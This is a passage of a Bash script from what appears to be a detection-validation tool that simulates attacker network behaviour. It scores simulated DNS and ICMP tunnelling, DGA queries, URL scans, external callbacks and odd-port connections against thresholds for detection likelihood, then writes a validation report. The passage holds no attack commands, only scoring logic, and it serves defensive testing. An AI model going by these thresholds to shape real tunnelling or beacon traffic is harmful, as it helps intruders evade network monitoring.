                TELEMETRY_VAL_DNS_REASON="${DNS_TUNNEL_DETECTION_REASON:-detection_likelihood=LOW} attempted=${attempted} entropy_score=${entropy}"
            fi
            ;;
    esac
    telemetry_set_module_counts TELEM_DNS_COUNTS "${planned}" "${attempted}" "${executed}" "${successful}"
}

evaluate_telemetry_http_url_scan() {
    local likelihood="${HTTP_URL_SCAN_DETECTION_LIKELIHOOD:-low}"
    local planned=$(safe_int "${HTTP_REQUESTS_PLANNED:-0}")
    local attempted=$(safe_int "${HTTP_REQUESTS_ATTEMPTED}")
    local executed="${attempted}"
    local successful=0

    if (( HTTP_REQUESTS_ATTEMPTED == 0 )); then
        if (( HTTP_SCAN_TARGET_COUNT == 0 )); then
            TELEMETRY_VAL_HTTP_URL_SCAN="skipped"
            TELEMETRY_VAL_HTTP_REASON="no_reachable_http_targets"
        else
            TELEMETRY_VAL_HTTP_URL_SCAN="failed"
            TELEMETRY_VAL_HTTP_REASON="total_requests=0"
        fi
        telemetry_set_module_counts TELEM_HTTP_COUNTS "${planned}" "${attempted}" "${executed}" "${successful}"
        return 0
    fi
    if [[ -z "${HTTP_URL_SCAN_FINAL_REASON}" ]]; then
        local fr=0 real_failed_cnt="${HTTP_URL_SCAN_REAL_FAILED:-0}"
        local http_400="${HTTP_400_COUNT:-0}" http_401="${HTTP_401_COUNT:-0}"
        local http_403="${HTTP_403_COUNT:-0}" http_404="${HTTP_404_COUNT:-0}" http_405="${HTTP_405_COUNT:-0}"
        local http_500="${HTTP_URL_SCAN_HTTP_500:-0}" timeout="${HTTP_URL_SCAN_TIMEOUT_COUNT:-0}"
        if (( real_failed_cnt == 0 )); then
            real_failed_cnt=$((http_400 + http_401 + http_403 + http_404 + http_405 + http_500 + timeout))
        fi
        (( HTTP_REQUESTS_ATTEMPTED > 0 )) && fr=$((real_failed_cnt * 100 / HTTP_REQUESTS_ATTEMPTED))
        compute_http_url_scan_detection_likelihood "${HTTP_REQUESTS_ATTEMPTED}" "${real_failed_cnt}" "${fr}" \
            "${http_400}" "${http_401}" "${http_403}" "${http_404}" "${http_405}" "${http_500}" "${timeout}"
        likelihood="${HTTP_URL_SCAN_DETECTION_LIKELIHOOD}"
    fi
    case "${likelihood}" in
        high)
            TELEMETRY_VAL_HTTP_URL_SCAN="success"
            TELEMETRY_VAL_HTTP_REASON="${HTTP_URL_SCAN_FINAL_REASON:-detection_likelihood=high attempted=${HTTP_REQUESTS_ATTEMPTED}}"
            successful=$(safe_int "${WEB_RESPONSES_RECEIVED:-${HTTP_URL_SCAN_REAL_FAILED:-${attempted}}}")
            ;;
        medium)
            TELEMETRY_VAL_HTTP_URL_SCAN="partial"
            TELEMETRY_VAL_HTTP_REASON="${HTTP_URL_SCAN_FINAL_REASON:-detection_likelihood=medium attempted=${HTTP_REQUESTS_ATTEMPTED}}"
            successful=$(safe_int "${WEB_RESPONSES_RECEIVED:-0}")
            ;;
        *)
            if [[ "${HTTP_URL_SCAN_STAGE_STATUS}" == warn || "${HTTP_URL_SCAN_STAGE_STATUS}" == partial ]]; then
                TELEMETRY_VAL_HTTP_URL_SCAN="partial"
            else
                TELEMETRY_VAL_HTTP_URL_SCAN="failed"
            fi
            TELEMETRY_VAL_HTTP_REASON="${HTTP_URL_SCAN_FINAL_REASON:-detection_likelihood=low attempted=${HTTP_REQUESTS_ATTEMPTED} fail_ratio=${URL_SCAN_UNIQUE_FAIL_RATIO:-0}%}"
            successful=$(safe_int "${WEB_RESPONSES_RECEIVED:-0}")
            ;;
    esac
    telemetry_set_module_counts TELEM_HTTP_COUNTS "${planned}" "${attempted}" "${executed}" "${successful}"
}

evaluate_telemetry_icmp_tunnel() {
    local sent=$(safe_int "${ICMP_PACKETS_ATTEMPTED}")
    local received=$(safe_int "${ICMP_REPLIES_RECEIVED}")
    local loss=$(safe_int "${ICMP_OVERALL_LOSS:-${ICMP_PACKET_LOSS:-0}}")
    local likelihood="${ICMP_DETECTION_LIKELIHOOD:-LOW}"
    local tls=$(safe_int "${ICMP_TUNNEL_LIKE_SCORE:-0}")
    local target_ip
    local planned=$(safe_int "${ICMP_PACKETS_PLANNED:-0}")
    local attempted=$(safe_int "${ICMP_PACKETS_ATTEMPTED_PLANNED:-${planned}}")
    local executed="${sent}"
    local successful=0
    target_ip=$(poc_extract_ipv4 "${ICMP_SELECTED_TARGET:-}")

    if ! icmp_is_valid_ipv4_target "${target_ip}"; then
        TELEMETRY_VAL_ICMP_TUNNEL="failed"
        TELEMETRY_VAL_ICMP_REASON="invalid_selected_target target=${ICMP_SELECTED_TARGET:-n/a}"
        telemetry_set_module_counts TELEM_ICMP_COUNTS "${planned}" "${attempted}" "${executed}" "${successful}"
        return 0
    fi
    if [[ "${ICMP_TARGET_REACHABLE}" == false ]] || [[ "${ICMP_SKIP_REASON}" =~ probe.*failed ]] || [[ "${ICMP_SKIP_REASON}" =~ no.*ICMP.*responsive ]]; then
        TELEMETRY_VAL_ICMP_TUNNEL="skipped"
        TELEMETRY_VAL_ICMP_REASON="${ICMP_SKIP_REASON:-target_probe_failed}"
        telemetry_set_module_counts TELEM_ICMP_COUNTS "${planned}" "${attempted}" "${executed}" "${successful}"
        return 0
    fi
    if (( sent == 0 )); then
        if [[ "${ICMP_TUNNEL_STAGE_STATUS}" == skipped ]] || [[ "${ICMP_SKIP_REASON}" =~ probe.*failed ]] || [[ "${ICMP_SKIP_REASON}" =~ no.*ICMP.*responsive ]]; then
            TELEMETRY_VAL_ICMP_TUNNEL="skipped"
            TELEMETRY_VAL_ICMP_REASON="${ICMP_SKIP_REASON:-ping_unavailable_or_not_run}"
        else
            TELEMETRY_VAL_ICMP_TUNNEL="failed"
            TELEMETRY_VAL_ICMP_REASON="command_execution_failed tunnel_like_score=0"
        fi
        telemetry_set_module_counts TELEM_ICMP_COUNTS "${planned}" "${attempted}" "${executed}" "${successful}"
        return 0
    fi
    if (( received == 0 )); then
        TELEMETRY_VAL_ICMP_TUNNEL="partial"
        TELEMETRY_VAL_ICMP_REASON="target_unresponsive packets_sent=${sent} received=0 tunnel_like_score=${tls} detection_likelihood=${likelihood}"
        telemetry_set_module_counts TELEM_ICMP_COUNTS "${planned}" "${attempted}" "${executed}" "${successful}"
        return 0
    fi
    if icmp_is_anomaly_only_mode "${ICMP_MODE_USED:-}"; then
        TELEMETRY_VAL_ICMP_TUNNEL="partial"
        TELEMETRY_VAL_ICMP_REASON="anomaly_only_not_tunnel_session mode=${ICMP_MODE_USED} sent=${sent} detection_likelihood=LOW ${ICMP_DETECTION_REASON:-}"
        successful="${received}"
        telemetry_set_module_counts TELEM_ICMP_COUNTS "${planned}" "${attempted}" "${executed}" "${successful}"
        return 0
    fi
    successful="${received}"
    case "${ICMP_TUNNEL_FINAL_RESULT:-${ICMP_TUNNEL_RESULT:-partial}}" in
        success)
            if (( sent >= 80 && received >= 40 && ICMP_BIDIRECTIONAL_RATIO >= 50 && tls >= 70 )) && [[ "${likelihood}" == HIGH ]] && (( ICMP_TIMEOUT_BURSTS <= 1 )); then
                TELEMETRY_VAL_ICMP_TUNNEL="success"
                TELEMETRY_VAL_ICMP_REASON="detection_likelihood=HIGH tunnel_like_score=${tls} actual=${sent} received=${received} loss=${loss}% bidir=${ICMP_BIDIRECTIONAL_RATIO:-0}% timeout_bursts=${ICMP_TIMEOUT_BURSTS:-0} ${ICMP_DETECTION_REASON:-}"
            else
                TELEMETRY_VAL_ICMP_TUNNEL="partial"
                TELEMETRY_VAL_ICMP_REASON="final_result=success_but_metrics_below_threshold actual=${sent} received=${received} score=${tls} likelihood=${likelihood} timeout_bursts=${ICMP_TIMEOUT_BURSTS:-0}"
            fi
            ;;
        failed)
            TELEMETRY_VAL_ICMP_TUNNEL="failed"
            TELEMETRY_VAL_ICMP_REASON="actual_packets=${sent} received=${received} timeout_bursts=${ICMP_TIMEOUT_BURSTS:-0} ${ICMP_DETECTION_REASON:-tunnel_failed}"
            ;;
        *)
            if [[ "${likelihood}" == HIGH ]] && (( tls >= 70 )); then
                TELEMETRY_VAL_ICMP_TUNNEL="partial"
                TELEMETRY_VAL_ICMP_REASON="detection_likelihood=HIGH_but_tunnel_like_score=${tls} actual=${sent} received=${received} timeout_bursts=${ICMP_TIMEOUT_BURSTS:-0} ${ICMP_DETECTION_REASON:-}"
            elif [[ "${likelihood}" == MEDIUM ]]; then
                TELEMETRY_VAL_ICMP_TUNNEL="partial"
                TELEMETRY_VAL_ICMP_REASON="detection_likelihood=MEDIUM tunnel_like_score=${tls} actual=${sent} received=${received} loss=${loss}% timeout_bursts=${ICMP_TIMEOUT_BURSTS:-0} ${ICMP_DETECTION_REASON:-}"
            else
                TELEMETRY_VAL_ICMP_TUNNEL="partial"
                if (( tls < 45 )); then
                    TELEMETRY_VAL_ICMP_REASON="detection_likelihood=LOW tunnel_like_score=${tls}<45 actual=${sent} received=${received} timeout_bursts=${ICMP_TIMEOUT_BURSTS:-0} ${ICMP_DETECTION_REASON:-}"
                else
                    TELEMETRY_VAL_ICMP_REASON="detection_likelihood=LOW tunnel_like_score=${tls} actual=${sent} received=${received} timeout_bursts=${ICMP_TIMEOUT_BURSTS:-0} ${ICMP_DETECTION_REASON:-}"
                fi
            fi
            ;;
    esac
    telemetry_set_module_counts TELEM_ICMP_COUNTS "${planned}" "${attempted}" "${executed}" "${successful}"
}

evaluate_telemetry_external_callback() {
    local planned=$(safe_int "${EXTERNAL_CALLBACK_PLANNED:-${EXTERNAL_CALLBACK_ATTEMPTED:-0}}")
    local attempted=$(safe_int "${EXTERNAL_CALLBACK_ATTEMPTED:-0}")
    local executed="${attempted}"
    local successful=$(safe_int "${EXTERNAL_CALLBACK_CONNECTED:-0}")
    TELEMETRY_VAL_EXTERNAL_CALLBACK=$(normalize_telemetry_module_status "$(external_callback_stage_status)")
    case "${TELEMETRY_VAL_EXTERNAL_CALLBACK}" in
        success) TELEMETRY_VAL_CALLBACK_REASON="connected=${EXTERNAL_CALLBACK_CONNECTED:-0} attempted=${EXTERNAL_CALLBACK_ATTEMPTED:-0}" ;;
        failed) TELEMETRY_VAL_CALLBACK_REASON="connected=0 attempted=${EXTERNAL_CALLBACK_ATTEMPTED:-0}" ;;
        *) TELEMETRY_VAL_CALLBACK_REASON="not_attempted" ;;
    esac
    telemetry_set_module_counts TELEM_CALLBACK_COUNTS "${planned}" "${attempted}" "${executed}" "${successful}"
}

evaluate_telemetry_nonstandard_port() {
    local host_count
    local planned attempted executed successful
    host_count=$(safe_int "$(count_hosts_blob "$(collect_nonstandard_port_hosts 2>/dev/null || true)")")
    planned=$(safe_int "${NONSTANDARD_PORT_CONNECTIONS:-0}")
    attempted="${planned}"
    executed="${planned}"
    successful=0
    if (( host_count == 0 )); then
        TELEMETRY_VAL_NONSTANDARD_PORT="skipped"
        TELEMETRY_VAL_NONSTANDARD_REASON="no_nonstandard_port_targets"
        telemetry_set_module_counts TELEM_NONSTANDARD_COUNTS "${planned}" "${attempted}" "${executed}" "${successful}"
        return 0
    fi
    if (( NONSTANDARD_PORT_CONNECTIONS > 0 )); then
        TELEMETRY_VAL_NONSTANDARD_PORT="success"
        TELEMETRY_VAL_NONSTANDARD_REASON="connections=${NONSTANDARD_PORT_CONNECTIONS}"
        successful="${NONSTANDARD_PORT_CONNECTIONS}"
    else
        TELEMETRY_VAL_NONSTANDARD_PORT="failed"
        TELEMETRY_VAL_NONSTANDARD_REASON="connections=0 targets=${host_count}"
    fi
    telemetry_set_module_counts TELEM_NONSTANDARD_COUNTS "${planned}" "${attempted}" "${executed}" "${successful}"
}

evaluate_telemetry_dga_simulation() {
    local planned attempted executed successful
    planned=$(safe_int "${DGA_QUERIES_PLANNED:-${DGA_NXDOMAIN_QUERIES:-250}}")
    (( planned < 1 )) && planned=250
    attempted="${planned}"
    executed=$(safe_int "${DGA_TOTAL_QUERIES}")
    successful=$((DGA_NXDOMAIN_COUNT + DGA_RESOLVED_COUNT))
    if [[ "${DGA_SIMULATION_ENABLED}" != true ]]; then
        TELEMETRY_VAL_DGA_SIMULATION="skipped"
        TELEMETRY_VAL_DGA_REASON="disabled"
        telemetry_set_module_counts TELEM_DGA_COUNTS "${planned}" "${attempted}" "${executed}" "${successful}"
        return 0
    fi
    dga_compute_detection_likelihood "${DGA_TOTAL_QUERIES}" "${DGA_NXDOMAIN_COUNT}" "${DGA_RESOLVED_COUNT}" "${DGA_SAME_EFFECTIVE_TLD:-yes}" "${DGA_ENTROPY_SCORE:-0}"
    if (( DGA_TOTAL_QUERIES == 0 )); then
        TELEMETRY_VAL_DGA_SIMULATION="failed"
        TELEMETRY_VAL_DGA_REASON="${DGA_SKIP_REASON:-total_queries=0} detection_likelihood=${DGA_DETECTION_LIKELIHOOD:-LOW}"
        telemetry_set_module_counts TELEM_DGA_COUNTS "${planned}" "${attempted}" "${executed}" "${successful}"
        return 0
    fi
    if (( DGA_NXDOMAIN_COUNT == 0 )); then
        TELEMETRY_VAL_DGA_SIMULATION="failed"
        TELEMETRY_VAL_DGA_REASON="${DGA_SKIP_REASON:-nxdomain=0 queries=${DGA_TOTAL_QUERIES}} detection_likelihood=${DGA_DETECTION_LIKELIHOOD:-LOW}"
        telemetry_set_module_counts TELEM_DGA_COUNTS "${planned}" "${attempted}" "${executed}" "${successful}"
        return 0
    fi
    if (( DGA_NXDOMAIN_COUNT < 150 || DGA_RESOLVED_COUNT < 3 )); then
        TELEMETRY_VAL_DGA_SIMULATION="partial"
        TELEMETRY_VAL_DGA_REASON="${DGA_DETECTION_REASON:-nxdomain=${DGA_NXDOMAIN_COUNT} resolved=${DGA_RESOLVED_COUNT} need_nx>=150 resolved>=3} detection_likelihood=${DGA_DETECTION_LIKELIHOOD:-LOW}"
        telemetry_set_module_counts TELEM_DGA_COUNTS "${planned}" "${attempted}" "${executed}" "${successful}"
        return 0
    fi
    if [[ "${DGA_SKIP_REASON}" == "dns_resolver_unavailable" && DGA_TOTAL_QUERIES -eq 0 ]]; then
        TELEMETRY_VAL_DGA_SIMULATION="failed"
        TELEMETRY_VAL_DGA_REASON="${DGA_SKIP_REASON}"
        telemetry_set_module_counts TELEM_DGA_COUNTS "${planned}" "${attempted}" "${executed}" "${successful}"
        return 0
    fi
    if [[ "${DGA_STAGE_STATUS}" == skipped ]]; then
        TELEMETRY_VAL_DGA_SIMULATION="skipped"
        TELEMETRY_VAL_DGA_REASON="${DGA_SKIP_REASON:-stage_skipped}"
        telemetry_set_module_counts TELEM_DGA_COUNTS "${planned}" "${attempted}" "${executed}" "${successful}"
        return 0
    fi
    if (( DGA_RESOLVED_COUNT == 0 )); then
        TELEMETRY_VAL_DGA_SIMULATION="partial"
        TELEMETRY_VAL_DGA_REASON="${DGA_DETECTION_REASON:-resolved_count=0 queries=${DGA_TOTAL_QUERIES}} detection_likelihood=${DGA_DETECTION_LIKELIHOOD:-LOW}"
        telemetry_set_module_counts TELEM_DGA_COUNTS "${planned}" "${attempted}" "${executed}" "${successful}"
        return 0
    fi
    case "${DGA_DETECTION_LIKELIHOOD}" in
        HIGH)
            if dga_window_condition_met "${DGA_NXDOMAIN_COUNT}" "${DGA_RESOLVED_COUNT}" "${DETECTION_WINDOW_DGA_NXDOMAIN}" "${DGA_DETECTION_LIKELIHOOD}"; then
                TELEMETRY_VAL_DGA_SIMULATION="success"
                TELEMETRY_VAL_DGA_REASON="${DGA_DETECTION_REASON:-detection_likelihood=HIGH} nxdomain=${DGA_NXDOMAIN_COUNT} resolved=${DGA_RESOLVED_COUNT}"
            elif (( DGA_NXDOMAIN_COUNT >= 150 && DGA_RESOLVED_COUNT >= 3 && DGA_TOTAL_QUERIES >= 200 )); then
                TELEMETRY_VAL_DGA_SIMULATION="success"
                TELEMETRY_VAL_DGA_REASON="${DGA_DETECTION_REASON:-threshold_met} nxdomain=${DGA_NXDOMAIN_COUNT} resolved=${DGA_RESOLVED_COUNT}"
            else
                TELEMETRY_VAL_DGA_SIMULATION="partial"
                TELEMETRY_VAL_DGA_REASON="${DGA_DETECTION_REASON:-threshold_not_met} nxdomain=${DGA_NXDOMAIN_COUNT} resolved=${DGA_RESOLVED_COUNT}"
            fi
            ;;
        MEDIUM)
            TELEMETRY_VAL_DGA_SIMULATION="partial"
            TELEMETRY_VAL_DGA_REASON="${DGA_DETECTION_REASON:-detection_likelihood=MEDIUM} nxdomain=${DGA_NXDOMAIN_COUNT} resolved=${DGA_RESOLVED_COUNT}"
            ;;
        *)
            TELEMETRY_VAL_DGA_SIMULATION="partial"
            TELEMETRY_VAL_DGA_REASON="${DGA_DETECTION_REASON:-detection_likelihood=LOW} nxdomain=${DGA_NXDOMAIN_COUNT} resolved=${DGA_RESOLVED_COUNT}"
            ;;
    esac
    telemetry_set_module_counts TELEM_DGA_COUNTS "${planned}" "${attempted}" "${executed}" "${successful}"
}

compute_overall_telemetry_validation() {
    local has_failed=false has_partial=false skipped_core=""
    local r

    for r in "${TELEMETRY_VAL_DNS_TUNNEL}" "${TELEMETRY_VAL_DGA_SIMULATION}" "${TELEMETRY_VAL_HTTP_URL_SCAN}" "${TELEMETRY_VAL_ICMP_TUNNEL}" \
             "${TELEMETRY_VAL_EXTERNAL_CALLBACK}" "${TELEMETRY_VAL_NONSTANDARD_PORT}"; do
        [[ "${r}" == failed ]] && has_failed=true
        [[ "${r}" == partial ]] && has_partial=true
    done
    [[ "${TELEMETRY_VAL_DNS_TUNNEL}" == skipped ]] && skipped_core="${skipped_core} dns_tunnel"
    [[ "${TELEMETRY_VAL_DGA_SIMULATION}" == skipped ]] && skipped_core="${skipped_core} dga_simulation"
    [[ "${TELEMETRY_VAL_HTTP_URL_SCAN}" == skipped ]] && skipped_core="${skipped_core} http_url_scan"
    [[ "${TELEMETRY_VAL_ICMP_TUNNEL}" == skipped ]] && skipped_core="${skipped_core} icmp_tunnel"
    [[ "${TELEMETRY_VAL_EXTERNAL_CALLBACK}" == skipped ]] && skipped_core="${skipped_core} external_callback"
    [[ "${TELEMETRY_VAL_NONSTANDARD_PORT}" == skipped ]] && skipped_core="${skipped_core} nonstandard_port"

    if [[ "${has_failed}" == true ]]; then
        TELEMETRY_VAL_OVERALL="failed"
    elif [[ "${has_partial}" == true ]]; then
        TELEMETRY_VAL_OVERALL="partial"
    elif [[ -n "${skipped_core// /}" ]]; then
        TELEMETRY_VAL_OVERALL="partial"
    else
        TELEMETRY_VAL_OVERALL="success"
    fi

    if [[ "${TELEMETRY_VAL_DNS_TUNNEL}" != success ]]; then
        TELEMETRY_VAL_OVERALL_REASON="${TELEMETRY_VAL_OVERALL_REASON:+$TELEMETRY_VAL_OVERALL_REASON; }dns_tunnel=${TELEMETRY_VAL_DNS_TUNNEL}(${TELEMETRY_VAL_DNS_REASON})"
    fi
    if [[ "${TELEMETRY_VAL_DGA_SIMULATION}" != success ]]; then
        TELEMETRY_VAL_OVERALL_REASON="${TELEMETRY_VAL_OVERALL_REASON:+$TELEMETRY_VAL_OVERALL_REASON; }dga_simulation=${TELEMETRY_VAL_DGA_SIMULATION}(${TELEMETRY_VAL_DGA_REASON})"
    fi
    if [[ "${TELEMETRY_VAL_HTTP_URL_SCAN}" != success ]]; then
        TELEMETRY_VAL_OVERALL_REASON="${TELEMETRY_VAL_OVERALL_REASON:+$TELEMETRY_VAL_OVERALL_REASON; }http_url_scan=${TELEMETRY_VAL_HTTP_URL_SCAN}(${TELEMETRY_VAL_HTTP_REASON})"
    fi
    if [[ "${TELEMETRY_VAL_ICMP_TUNNEL}" != success ]]; then
        TELEMETRY_VAL_OVERALL_REASON="${TELEMETRY_VAL_OVERALL_REASON:+$TELEMETRY_VAL_OVERALL_REASON; }icmp_tunnel=${TELEMETRY_VAL_ICMP_TUNNEL}(${TELEMETRY_VAL_ICMP_REASON})"
    fi
    if [[ "${TELEMETRY_VAL_EXTERNAL_CALLBACK}" != success ]]; then
        TELEMETRY_VAL_OVERALL_REASON="${TELEMETRY_VAL_OVERALL_REASON:+$TELEMETRY_VAL_OVERALL_REASON; }external_callback=${TELEMETRY_VAL_EXTERNAL_CALLBACK}(${TELEMETRY_VAL_CALLBACK_REASON})"
    fi
    if [[ "${TELEMETRY_VAL_NONSTANDARD_PORT}" != success ]]; then
        TELEMETRY_VAL_OVERALL_REASON="${TELEMETRY_VAL_OVERALL_REASON:+$TELEMETRY_VAL_OVERALL_REASON; }nonstandard_port=${TELEMETRY_VAL_NONSTANDARD_PORT}(${TELEMETRY_VAL_NONSTANDARD_REASON})"
    fi
    if [[ -n "${skipped_core// /}" && "${TELEMETRY_VAL_OVERALL}" != failed ]]; then
        TELEMETRY_VAL_OVERALL_REASON="${TELEMETRY_VAL_OVERALL_REASON:+$TELEMETRY_VAL_OVERALL_REASON; }skipped_modules:${skipped_core# }"
    fi
    if [[ -z "${TELEMETRY_VAL_OVERALL_REASON}" ]]; then
        TELEMETRY_VAL_OVERALL_REASON="all_core_modules_success"
    fi
}

log_final_telemetry_validation() {
    local msg="FINAL_TELEMETRY_VALIDATION dns_tunnel=${TELEMETRY_VAL_DNS_TUNNEL} dns_${TELEM_DNS_COUNTS} dns_reason=${TELEMETRY_VAL_DNS_REASON} dga_simulation=${TELEMETRY_VAL_DGA_SIMULATION} dga_${TELEM_DGA_COUNTS} dga_reason=${TELEMETRY_VAL_DGA_REASON} http_url_scan=${TELEMETRY_VAL_HTTP_URL_SCAN} http_${TELEM_HTTP_COUNTS} http_reason=${TELEMETRY_VAL_HTTP_REASON} icmp_tunnel=${TELEMETRY_VAL_ICMP_TUNNEL} icmp_${TELEM_ICMP_COUNTS} icmp_reason=${TELEMETRY_VAL_ICMP_REASON} external_callback=${TELEMETRY_VAL_EXTERNAL_CALLBACK} callback_${TELEM_CALLBACK_COUNTS} callback_reason=${TELEMETRY_VAL_CALLBACK_REASON} nonstandard_port=${TELEMETRY_VAL_NONSTANDARD_PORT} nonstandard_${TELEM_NONSTANDARD_COUNTS} nonstandard_reason=${TELEMETRY_VAL_NONSTANDARD_REASON} overall=${TELEMETRY_VAL_OVERALL} overall_reason=${TELEMETRY_VAL_OVERALL_REASON}"
    state_append "final_telemetry_validation.log" "${msg}"
    log_message "OK" "${msg}" >&2
}

apply_telemetry_validation_to_legacy_result() {
    case "${TELEMETRY_VAL_OVERALL}" in
        failed)
            VALIDATION_RESULT="FAIL"
            VALIDATION_REASON="${TELEMETRY_VAL_OVERALL_REASON}"
            ;;
        partial)
            VALIDATION_RESULT="WARN"
            VALIDATION_REASON="${TELEMETRY_VAL_OVERALL_REASON}"
            ;;
        *)
            VALIDATION_RESULT="PASS"
            VALIDATION_REASON="All follow-up telemetry checks passed"
            ;;
    esac
}

sync_dga_telemetry_from_persisted_state() {
    local line="" st=""
    if (( DGA_TOTAL_QUERIES > 0 )); then
        return 0
    fi
    line=$(read_state_file_or_none "dga_simulation.log" | grep -E 'DGA_STAGE_FINAL_SUMMARY' | tail -n1 || true)
    if [[ -z "${line}" && -n "${LOG_DIR}" && -f "${LOG_DIR}/dga_simulation.log" ]]; then
        line=$(grep -E 'DGA_STAGE_FINAL_SUMMARY' "${LOG_DIR}/dga_simulation.log" 2>/dev/null | tail -n1 || true)
    fi
    [[ -z "${line}" ]] && return 1
    DGA_TOTAL_QUERIES=$(safe_int "$(dns_stats_field_from_line "${line}" queries)")
    DGA_NXDOMAIN_COUNT=$(safe_int "$(dns_stats_field_from_line "${line}" nxdomain)")
    DGA_RESOLVED_COUNT=$(safe_int "$(dns_stats_field_from_line "${line}" resolved)")
    DGA_QUERIES_ATTEMPTED="${DGA_TOTAL_QUERIES}"
    DGA_QUERIES_SENT="${DGA_TOTAL_QUERIES}"
    st=$(dns_stats_field_from_line "${line}" status)
    if [[ -n "${st}" ]]; then
        case "${st,,}" in
            success) DGA_STAGE_STATUS="Success" ;;
            partial) DGA_STAGE_STATUS="Partial" ;;
            skipped) DGA_STAGE_STATUS="Skipped" ;;
            failed|*) DGA_STAGE_STATUS="Failed" ;;
        esac
    fi
    dga_compute_detection_likelihood "${DGA_TOTAL_QUERIES}" "${DGA_NXDOMAIN_COUNT}" "${DGA_RESOLVED_COUNT}" "${DGA_SAME_EFFECTIVE_TLD:-yes}" "${DGA_ENTROPY_SCORE:-0}"
    return 0
}

sync_dns_tunnel_telemetry_from_persisted_state() {
    local line="" path_attempted=0
    path_attempted=$((DNS_TUNNEL_ENH_ATTEMPTED + DNS_TUNNEL_FB_ATTEMPTED))
    if (( DNS_QUERIES_ATTEMPTED > 0 || path_attempted > 0 )); then
        return 0
    fi
    line=$(read_state_file_or_none "dns_tunnel_final_summary.log" | grep -E 'DNS_TUNNEL_FINAL_SUMMARY' | tail -n1 || true)
    if [[ -z "${line}" ]]; then
        line=$(read_state_file_or_none "dns_tunnel_simulation.log" | grep -E 'DNS_STAGE_FINAL_SUMMARY|DNS_TUNNEL_FINAL_SUMMARY' | tail -n1 || true)
    fi
    [[ -z "${line}" ]] && return 1
    DNS_QUERIES_PLANNED=$(safe_int "$(dns_stats_field_from_line "${line}" planned)")
    DNS_QUERIES_ATTEMPTED=$(safe_int "$(dns_stats_field_from_line "${line}" attempted)")
    DNS_TUNNEL_UNIQUE_QUERIES=$(safe_int "$(dns_stats_field_from_line "${line}" unique_queries)")
    DNS_TUNNEL_NXDOMAIN_COUNT=$(safe_int "$(dns_stats_field_from_line "${line}" nxdomain)")
    DNS_TUNNEL_RESOLVED_COUNT=$(safe_int "$(dns_stats_field_from_line "${line}" resolved)")
    DNS_TUNNEL_TIMEOUT_COUNT=$(safe_int "$(dns_stats_field_from_line "${line}" timeout)")
    DNS_TUNNEL_ERROR_COUNT=$(safe_int "$(dns_stats_field_from_line "${line}" error)")
    return 0
}

sync_icmp_telemetry_from_persisted_state() {
    local line="" field=""
    if (( ICMP_PACKETS_ATTEMPTED > 0 && ICMP_TUNNEL_LIKE_SCORE > 0 )); then
        return 0
    fi
    line=$(read_state_file_or_none "icmp_tunnel_simulation.log" | grep -E 'ICMP_TUNNEL_FINAL_SUMMARY' | tail -n1 || true)
    if [[ -z "${line}" && -n "${LOG_DIR}" && -f "${LOG_DIR}/icmp_tunnel_simulation.log" ]]; then
        line=$(grep -E 'ICMP_TUNNEL_FINAL_SUMMARY' "${LOG_DIR}/icmp_tunnel_simulation.log" 2>/dev/null | tail -n1 || true)
    fi
    [[ -z "${line}" ]] && return 1
    field=$(dns_stats_field_from_line "${line}" planned_packets)
    [[ -n "${field}" ]] && ICMP_PACKETS_PLANNED=$(safe_int "${field}")
    field=$(dns_stats_field_from_line "${line}" attempted_packets)
    [[ -n "${field}" ]] && ICMP_PACKETS_ATTEMPTED_PLANNED=$(safe_int "${field}")
    field=$(dns_stats_field_from_line "${line}" actual_packets)
    [[ -n "${field}" ]] && ICMP_PACKETS_ATTEMPTED=$(safe_int "${field}")
    field=$(dns_stats_field_from_line "${line}" total_packets_received)
    [[ -n "${field}" ]] && ICMP_REPLIES_RECEIVED=$(safe_int "${field}")
    field=$(dns_stats_field_from_line "${line}" tunnel_like_score)
    [[ -n "${field}" ]] && ICMP_TUNNEL_LIKE_SCORE=$(safe_int "${field}")
    return 0
}

compute_final_telemetry_validation() {
    load_overlap_stage_results_from_state
    sync_dga_telemetry_from_persisted_state || true
    sync_dns_tunnel_telemetry_from_persisted_state || true
    sync_icmp_telemetry_from_persisted_state || true
    evaluate_telemetry_dns_tunnel
    evaluate_telemetry_dga_simulation
    evaluate_telemetry_http_url_scan
    evaluate_telemetry_icmp_tunnel
    evaluate_telemetry_external_callback
    evaluate_telemetry_nonstandard_port
    compute_overall_telemetry_validation

    if (( EXTERNAL_CALLBACK_CONNECTED == 0 && INTERNAL_FANOUT_TARGETS > 0 && INTERNAL_FANOUT_ATTEMPTED == 0 )); then
        TELEMETRY_VAL_OVERALL="failed"
        TELEMETRY_VAL_OVERALL_REASON="internal_fanout_execution_failure; ${TELEMETRY_VAL_OVERALL_REASON}"
    fi
    if [[ "${FOLLOWUP_VALIDATION_FAILED}" == true && "${TELEMETRY_VAL_OVERALL}" != failed ]]; then
        TELEMETRY_VAL_OVERALL="failed"
        TELEMETRY_VAL_OVERALL_REASON="followup_validation_failed; ${TELEMETRY_VAL_OVERALL_REASON}"
    fi

    log_final_telemetry_validation
    apply_telemetry_validation_to_legacy_result
}

compute_followup_validation_result() {
    compute_final_telemetry_validation
}

format_validation_result_block() {
    compute_and_log_final_validation
    cat <<EOF
Validation Result
- result                      : ${VALIDATION_RESULT}
- reason                      : ${VALIDATION_REASON}
- overall_result              : ${OVERALL_RESULT}
- telemetry_overall           : ${TELEMETRY_VAL_OVERALL}
- dns_tunnel                  : ${TELEMETRY_VAL_DNS_TUNNEL} (${TELEMETRY_VAL_DNS_REASON})
- dga_simulation              : ${TELEMETRY_VAL_DGA_SIMULATION} (${TELEMETRY_VAL_DGA_REASON})
- http_url_scan               : ${TELEMETRY_VAL_HTTP_URL_SCAN} (${TELEMETRY_VAL_HTTP_REASON})
- icmp_tunnel                 : ${TELEMETRY_VAL_ICMP_TUNNEL} (${TELEMETRY_VAL_ICMP_REASON})
- external_callback           : ${TELEMETRY_VAL_EXTERNAL_CALLBACK} (${TELEMETRY_VAL_CALLBACK_REASON})
- nonstandard_port            : ${TELEMETRY_VAL_NONSTANDARD_PORT} (${TELEMETRY_VAL_NONSTANDARD_REASON})

FINAL_VALIDATION
service_discovery=${FINAL_VAL_SERVICE_DISCOVERY}
http_followup=${FINAL_VAL_HTTP_FOLLOWUP}
ssh_followup=${FINAL_VAL_SSH_FOLLOWUP}
dns_tunnel=${FINAL_VAL_DNS_TUNNEL}
icmp_tunnel=${FINAL_VAL_ICMP_TUNNEL}
dga=${FINAL_VAL_DGA}
beacon=${FINAL_VAL_BEACON}
external_callback=${FINAL_VAL_EXTERNAL_CALLBACK}
